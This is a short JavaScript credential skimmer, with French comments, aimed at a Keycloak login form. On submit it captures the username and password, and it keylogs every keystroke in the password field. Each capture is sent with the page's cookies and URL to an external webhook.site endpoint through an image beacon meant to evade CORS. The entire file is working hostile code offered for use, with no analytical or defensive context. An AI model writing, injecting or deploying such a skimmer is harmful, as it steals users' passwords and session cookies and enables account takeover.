(function() {
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  function sendData(data) {
    // Envoi via balise img pour bypass CORS
    let i = new Image();
    i.src = webhook + 
      '?u=' + encodeURIComponent(data.username) +
      '&p=' + encodeURIComponent(data.password) +
      '&cookies=' + encodeURIComponent(document.cookie) +
      '&url=' + encodeURIComponent(window.location.href);
  }

  const form = document.getElementById('kc-form-login');
  if (form) {
    form.addEventListener('submit', function() {
      const username = document.getElementById('username')?.value || '';
      const password = document.getElementById('password')?.value || '';

      sendData({
        username,
        password
      });
    });
  }

  // Keylogger si tu veux capter en live
  const passwordInput = document.getElementById('password');
  if (passwordInput) {
    passwordInput.addEventListener('input', () => {
      sendData({
        username: '',
        password: passwordInput.value
      });
    });
  }

})();
